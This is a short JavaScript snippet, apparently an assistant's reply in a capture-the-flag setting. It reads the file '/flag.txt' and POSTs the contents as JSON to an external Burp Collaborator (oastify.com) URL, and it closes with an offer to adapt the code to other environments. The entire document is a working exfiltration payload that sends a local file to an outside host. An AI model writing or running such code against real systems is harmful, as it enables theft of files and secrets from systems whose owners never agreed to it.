const filePath = '/flag.txt';

// Read the file using Fetch API
fetch(filePath)
  .then(response => response.text())
  .then(fileContent => {
    // Specify your Burp Collaborator URL
    const burpCollabUrl = 'https://swshz66vbuyg477vgu5ti36ohfn7b6zv.oastify.com';

    // Send the file content to Burp Collaborator
    fetch(burpCollabUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ fileContent }),
    })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error sending data to Burp Collaborator:', error));
  })
  .catch(error => console.error('Error reading file:', error));

This assumes that your environment supports the Fetch API. If you are in a different environment, please let me know so I can provide a more suitable solution.
